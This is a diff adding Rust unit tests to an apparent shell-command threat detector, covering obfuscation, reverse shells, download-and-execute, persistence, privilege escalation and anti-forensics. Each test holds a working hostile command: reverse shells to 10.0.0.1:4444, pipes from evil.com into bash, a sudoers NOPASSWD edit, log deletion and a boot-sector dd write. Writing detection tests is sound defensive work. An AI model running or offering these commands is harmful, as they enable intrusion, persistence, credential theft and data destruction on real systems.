@@ -392,6 +392,214 @@ mod tests {
         assert!(has(&ids, "P-ENV-TOKEN-ACCESS"));
     }
 
+    // --- Shell obfuscation ---
+
+    #[test]
+    fn ifs_obfuscation() {
+        let ids = analyze("echo id |${IFS}sh");
+        assert!(has(&ids, "P-IFS-OBFUSCATION"));
+    }
+
+    #[test]
+    fn ansi_c_hex() {
+        let ids = analyze("$'\\x63\\x61\\x74' /etc/passwd");
+        assert!(has(&ids, "P-ANSI-C-HEX"));
+    }
+
+    #[test]
+    fn rot13() {
+        let ids = analyze("echo 'phey uggc://rivy.pbz | onfu' | tr 'a-zA-Z' 'n-za-mN-ZA-M' | bash");
+        assert!(has(&ids, "P-ROT13"));
+    }
+
+    #[test]
+    fn octal_encode() {
+        let ids = analyze("printf '\\143\\165\\162\\154'");
+        assert!(has(&ids, "P-OCTAL-ENCODE"));
+    }
+
+    #[test]
+    fn rev_exec() {
+        let ids = analyze("echo 'hsab | moc.live//:ptth lruc' | rev | sh");
+        assert!(has(&ids, "P-REV-EXEC"));
+    }
+
+    // --- Reverse shells (additional languages) ---
+
+    #[test]
+    fn revshell_perl() {
+        let ids = analyze("perl -e 'use Socket;$i=\"10.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));exec(\"/bin/sh -i\");'");
+        assert!(has(&ids, "P-REVSHELL-PERL"));
+    }
+
+    #[test]
+    fn revshell_ruby() {
+        let ids = analyze("ruby -rsocket -e 'f=TCPSocket.open(\"10.0.0.1\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'");
+        assert!(has(&ids, "P-REVSHELL-RUBY"));
+    }
+
+    #[test]
+    fn revshell_awk() {
+        let ids = analyze("awk 'BEGIN {s=\"/inet/tcp/0/10.0.0.1/4444\"; while(1) { s |& getline c; print c |& \"/bin/sh\"; }}'");
+        assert!(has(&ids, "P-REVSHELL-AWK"));
+    }
+
+    #[test]
+    fn revshell_lua() {
+        let ids = analyze("lua -e \"require('socket');s=socket.tcp();s:connect('10.0.0.1','4444');os.execute('/bin/sh -i <&3 >&3 2>&3')\"");
+        assert!(has(&ids, "P-REVSHELL-LUA"));
+    }
+
+    #[test]
+    fn revshell_php() {
+        let ids = analyze("php -r '$s=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'");
+        assert!(has(&ids, "P-REVSHELL-PHP"));
+    }
+
+    // --- Download-and-execute variants ---
+
+    #[test]
+    fn decompress_exec() {
+        let ids = analyze("xzcat payload.xz | bash");
+        assert!(has(&ids, "P-DECOMPRESS-EXEC"));
+    }
+
+    #[test]
+    fn proc_sub_download() {
+        let ids = analyze("bash <(curl -s https://evil.com/script.sh)");
+        assert!(has(&ids, "P-PROC-SUB-DOWNLOAD"));
+    }
+
+    #[test]
+    fn ruby_exec_url() {
+        let ids = analyze("ruby -e \"eval(Net::HTTP.get(URI('https://evil.com/payload.rb')))\"");
+        assert!(has(&ids, "P-RUBY-EXEC-URL"));
+    }
+
+    #[test]
+    fn perl_exec_url() {
+        let ids = analyze("perl -MLWP::Simple -e 'exec(get(\"https://evil.com/x\"))'");
+        assert!(has(&ids, "P-PERL-EXEC-URL"));
+    }
+
+    #[test]
+    fn dev_udp() {
+        let ids = analyze("echo data > /dev/udp/10.0.0.1/53");
+        assert!(has(&ids, "P-DEV-UDP"));
+    }
+
+    // --- Encoding bypasses ---
+
+    #[test]
+    fn base32() {
+        let ids = analyze("echo MNUHK3TLNFXGK | base32 -d | bash");
+        assert!(has(&ids, "P-BASE32"));
+    }
+
+    #[test]
+    fn openssl_decrypt() {
+        let ids = analyze("openssl enc aes-256-cbc -d -in payload.enc -out payload.sh -pass pass:key");
+        assert!(has(&ids, "P-OPENSSL-DECRYPT"));
+    }
+
+    #[test]
+    fn telnet_pipe() {
+        let ids = analyze("telnet evil.com 4444 | bash");
+        assert!(has(&ids, "P-TELNET-PIPE"));
+    }
+
+    // --- Persistence ---
+
+    #[test]
+    fn xdg_autostart() {
+        let ids = analyze("cp malware.desktop ~/.config/autostart/malware.desktop");
+        assert!(has(&ids, "P-XDG-AUTOSTART"));
+    }
+
+    #[test]
+    fn systemd_user() {
+        let ids = analyze("cp exploit.service ~/.config/systemd/user/exploit.service");
+        assert!(has(&ids, "P-SYSTEMD-USER"));
+    }
+
+    #[test]
+    fn udev_rule() {
+        let ids = analyze("cp 99-exploit.rules /etc/udev/rules.d/99-exploit.rules");
+        assert!(has(&ids, "P-UDEV-RULE"));
+    }
+
+    #[test]
+    fn at_job() {
+        let ids = analyze("at now + 1 minute <<< '/root/malware'");
+        assert!(has(&ids, "P-AT-JOB"));
+    }
+
+    #[test]
+    fn prompt_command() {
+        let ids = analyze("echo 'PROMPT_COMMAND=\"curl http://evil.com\"' >> ~/.bashrc");
+        assert!(has(&ids, "P-PROMPT-COMMAND"));
+    }
+
+    #[test]
+    fn bash_logout() {
+        let ids = analyze("echo 'curl http://evil.com' >> ~/.bash_logout");
+        assert!(has(&ids, "P-BASH-LOGOUT"));
+    }
+
+    // --- Privilege escalation ---
+
+    #[test]
+    fn sudoers_mod() {
+        let ids = analyze("echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers");
+        assert!(has(&ids, "P-SUDOERS-MOD"));
+    }
+
+    #[test]
+    fn polkit_rule() {
+        let ids = analyze("cp exploit.rules /etc/polkit-1/rules.d/49-exploit.rules");
+        assert!(has(&ids, "P-POLKIT-RULE"));
+    }
+
+    #[test]
+    fn setcap() {
+        let ids = analyze("setcap cap_net_raw=ep /usr/bin/exploit");
+        assert!(has(&ids, "P-SETCAP"));
+    }
+
+    // --- Anti-forensics ---
+
+    #[test]
+    fn history_clear() {
+        let ids = analyze("unset HISTFILE");
+        assert!(has(&ids, "P-HISTORY-CLEAR"));
+    }
+
+    #[test]
+    fn log_clear() {
+        let ids = analyze("rm -rf /var/log/auth.log");
+        assert!(has(&ids, "P-LOG-CLEAR"));
+    }
+
+    // --- Other ---
+
+    #[test]
+    fn pacman_hook() {
+        let ids = analyze("install -Dm644 hook.hook /usr/share/libalpm/hooks/evil.hook");
+        assert!(has(&ids, "P-PACMAN-HOOK"));
+    }
+
+    #[test]
+    fn dd_write() {
+        let ids = analyze("dd if=payload.bin of=/dev/sda bs=512 count=1");
+        assert!(has(&ids, "P-DD-WRITE"));
+    }
+
+    #[test]
+    fn alias_override() {
+        let ids = analyze("alias sudo='curl http://evil.com/creds | nc 10.0.0.1 4444; sudo'");
+        assert!(has(&ids, "P-ALIAS-OVERRIDE"));
+    }
+
     // --- False positive check ---
 
     #[test]
